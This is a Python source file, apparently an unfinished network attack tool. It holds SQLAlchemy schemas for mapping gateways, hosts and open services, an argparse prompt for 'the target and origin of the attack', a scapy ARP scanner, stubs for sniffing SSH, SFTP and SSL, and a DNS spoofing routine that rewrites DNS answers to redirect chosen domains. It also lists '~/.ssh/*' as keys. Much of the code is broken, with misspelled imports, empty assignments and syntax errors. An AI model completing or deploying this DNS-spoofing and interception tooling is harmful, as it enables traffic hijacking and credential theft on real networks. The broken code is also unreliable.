#

import collections, server, ssl , time, threading, asyncio, functools, os, pathlib, logging, sys, atexit, sqlite3, netfilterqueqe, string, argsparse
from sqlalchemy import Column, Integer, String, MetaData, Table, Select
from pandas import DataFrame, MultiIndex, Series
from sqlalchemy.orm.decl_api import DeclarativeMeta 
from server import Base, Database
import contextlib 
import numpy as npy
import asyncio as sync 
import argparse
import string
import ip 

logging.basicConfig(
    level=logging.DEBUG,
    format='(%(Appname)s %(threadName)-10s) %(message)s',
    filename="sycllanetwork.log"
);

PATH = (
    Volumes= 'volumes/*',
    Interface= '/dev/d*',
    Cache= '/tmp',
    Keys= '~/.ssh/*',
    Log= '/var/log/scylla/*')

async def symbol():
    def __init__(self):
        with PATH as path:
            for i in path:
                os.path.add_arguemnt(i)
    pass 

t=threading.Event()
local_server_local_address= 
sql=sqlite3
register=atexit.register()
array=npy.array()
df=DataFrame
series=Series
mi= MultiIndex

def query_statement():
    pass 
query=query_statement
class Main_Gateway_Scheme(Base):
    __tablename__= "main_gateway__scheme"
    mac_uuid: []= mapped_column("uuid",Binary(), unique=True, nullable=False)
    gate_cidr= mapped_column("gateway",primary_key=True, nullable=False)
    gatewayipv4=Column("gateway4",Binary(4),primary_key=True, nullable=True)
    hops=Column("hops", Binary(), nullable=False)
    gatewayipv6= Column("gatway6",Binary(16), unique= True, primary_key=True, nullable=False) 
    gatewayname=Column("gatewayname",Binary(4), primary_key=False , nullable= True )
    domain=Column("Company", Binary(), unique=True, nullable=False )

class Node_Edge_Scheme(Base):
    __tablename__= "node_edge_scheme"
    mac_uuid: Mapped[]=Column("uuid",primary_key=True)
    mac=Column("mac",Binary(),primary_key=True)
    hops=Column("hops",Binary())
    cidr=Column("cidr",Binary(2),foreign_key=True,nullable=False)
    services=Column("open_services",LargeBinary(),nullable=False)
    port=Column("port",Binary(),nullable=True)
    gateway: Mapped[]=mapped_column("gatewayipv6",Binary(16),foreign_key_key=True, nullable= False)
    ifgateway=Column("isgateway",Boolean(), primary_key=True, nullable=False)
    bgp=Column()

class Port_Services(Base):
    __tablename__= "service_map_relationship"
    device_uuid: Mapped []=mapped_column("uuid",Binary(), primary_key=True)
    gateway=Column("gateway",Binary(16),primary_key=True)
    services=Column("array", LargeBinary(), nullable=False)
    nodes: Mapped[]=Column("edges", LargeBinary(), nullable=False)
    hostipv6=Column("hostipv6",primary_key=True, nullable=False)
class Kansas_Cinncinati__Schema(Base):
    __tablename__="kansas_cincinnati__scheme"
    uuid: Mapped[]=Column("uuid",unique=True,primary_key=True,nullable=True)
    hops=Column(Binary(), nullable=False)
    hostmac=Column(nullable=True)
    hostipv6=Column()
    gatecid=Column("cidr",Binary(), nullable=False  )
    gateway=Column()
    headgateway6: Mapped[]=mapped_column(Primary_key=True, nullable=False )
    bgp=Column("bgp",Boolean(),)
    edges=Column("edges",Array(), nullable=False )
    port=("map",Array(), nullable=False)
class Route_Table_Schema(Base):
    __tablename__="route_schemes"
    gateway6: Mapped[]=mapped_column( Binary(), primary_key=True, nullable=False)
    edges: Mapped[]=Column(Array(), nullable=False )
    hosts=Column( Array(), primary_key=True, nullable=False )
    bgp=Column()
    hops=Column("hops", Binary(), primary_key=True, nullable=False)

class Dns_Table_Schema(Database):
    __tablename__=""
    uuid: Mapped[]=relationship()
    mac: Mapped[]=Column("mac ", primary_key=True)
    def __init__(self, *args):
        hops, provider, isp
        self.hops=0
        self.service_provider=0
        self.isp=
class Database_Table_Schema(Database):
    __tablename__="database_routes_schema"
    uuid=()
    hostipv6=Column()
    sub=Column()
    hostname=Column()
    url=Column()
    fitness=Column()
    masks=Column()
class Primary_Table_Schema(Database):
    __tablename__ = "mac_table__schema"
    @mapper_registry.as_declarative()
    id=Column()
    uuid=Column("uuid", Binary(),primary_key=True)
    mac=Column("mac",Binary(16), primary_key=True)
    cidr=Column("cidr",Binary(2), nullable=True)
    routes: []=mapped_column("edges",Array(), fore_key=True )
    update=Column()  
    def __init__(self):
        pass 

def init_sqlite_tables(drivename, name):
    session=self.session
    engine=self.engine(url.set(drivername=drivename,database=name) echo)
    self.meta.create_all(engine)
    if session()


def init_new_database_tables_(*args):
    with self.session as session:
        session.add_all([])
        session.commit()
    pass


class LocalDatabase(Database):
    def __init__(self, drivename, username, password, host, port, database, query)
        super(Database).__init__()
    pass 
     
    
class RemoteDatabase(Database):
    def __init__(self, drivername, username, password, host, port, database, query):
         super(Database).__init__()
          
   
    pass
    
class Userdatabase(LocalDatabase, RemoteDatabase):
    def __init_subclass(self, *args):
        if :
            super(RemoteDatabase).__prepare__(cls, drivename, username, password, host, port, database, query)
        elif: 
            super(LocalDatabase).__init__( drivename, username, password, host, port, database, query)
        else: 
            raise 
            pass 
    def __init_subclass(cls,, *args: string):
        namespace=type.__prepare__(cls, ())
        args= list(inspect.signature(cls).parameters)
        signature=','.join('{self.%s!r}'% arg for arg in args)
        title='def __call__(cls, remote: Boolean, **kwargs, ) -> type:\n'
        title+=f'  return super().__call__(remote: Boolean, **kwargs)'
        header={}
        exec(
            title,
            header)
        return cls._registry[][name]=cls
  
class ProductDatabase(contextlib):
    def __init__(self, api, func):
       super(Userdatabase)...
        pass 
    add=
    commit= 
    search= 

class IndividualFactorDistribution:
    def __init__(self):
        self.idf= DataFrame()

class MultiFactorDistribution:
    def __init__(self, input, column_series, *args):
        self.mfd = Series(data=input, , columns= column_series) 
 
class FrameworkData():
    def __init__(self):

        pass 

product = ProductDatabase()
index = FrameworkData

def user_input_target(self, **kwargs):
   pass 

def user_input_origin( *args):
   pass 

target_by_user = user_input_target
origin_by_user = user_input_origin
parser = argparse.ArgumentParser(
    description=' Enter the target and origin of the attack',
)
def scan_prompt_data(self) -> :
    with sys.argv as argv:
        print('set arguemnets: ', argv)
    if x is not None: 
        print(' continue  ')
    else :
        sys.stdout.write()

def whois(target:any ,origin:string):
        from scapy.all import ARP, Ether, srp
        function_arp=ARP 
        function_ether=Ether
        
        while True:
            try: 
                if target== type([]): 
                    for i in target: 
                        function_arp(op=ARP.who_has,pdst=i)
                        function_ether(dst=origin)
                else:
                    ARP(op=ARP.who_has, pdst=target)
                    Ether(dst=origin)
            except: 
            if origin is None:
                fire= function_arp/function_broadcast
                res=srp(fire, timeout=1, verbose=False)[0]
                return res[0][1].hwsrc
    with index() as arp_index:
        pass 
def sniff_sftp():
    
    pass 

def sniff_sshp():
    pass 

def sniff_ssl():
    pass 

def spoof(packet):
    from scapy.all import scapy
    packet = scapy.IP(packet.get_payload())
    while packet.haslayer(scapy.DNSRR):
        qname = packet[scapy.DNSQR].qname 
        for i in target_by_user:
            if target_by_user in qname: 
                payload = scapy.DNSRR(rrname=qname, rdata=origin_by_user)
                packet[scapy.DNS].an = payload 
                packet[scapy.DNS].ancount = 1
                del packet[scapy.IP].len
                del packet[scapy.IP].chksum
                del packet[scapy.UDP].chksum
                del packet[scapy.UDP].chksum
                del packet[scapy.UDP].len 
            packet.set_payload(str())


scan_event= threading.Event()

scan_input_thread = threading.Thread(
    name=' scanning user input %()s'
    target = scan_prompt_data,
    args=(t,)
)

process_spoof_thread = threading.Thread(
    name=' packet processing %()s'
    target= process,
    args=(),
)

log = logging.getProcess()

process = ( process_spoof_thread  )
def main():
  arp_index

  parser.add_arguemnt('end', action=, default=False)
  parser.add_arguemnt('start', action=, default=True)
  parser.addd_arguement('get', action=, default=False)
  parser.add_arguemnt('--spoof',action=,default=False)
  parser.add_arguement('--connect',action=,default=False)
  while True:
    

if __name__ is __main__:
    main()